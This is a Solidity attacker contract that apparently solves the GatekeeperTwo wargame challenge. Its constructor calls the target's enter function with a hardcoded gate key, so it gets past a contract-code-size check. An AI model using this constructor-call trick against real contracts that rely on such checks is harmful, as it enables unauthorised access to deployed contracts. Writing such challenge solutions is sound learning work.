// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttacker {
    GatekeeperTwo public gatekeeperTwo;
    bool public isSuccess;
    
    constructor(GatekeeperTwo _gatekeeperTwo) public {
        gatekeeperTwo = _gatekeeperTwo;
        isSuccess = gatekeeperTwo.enter(0x302237626af02e3d);
    }
}
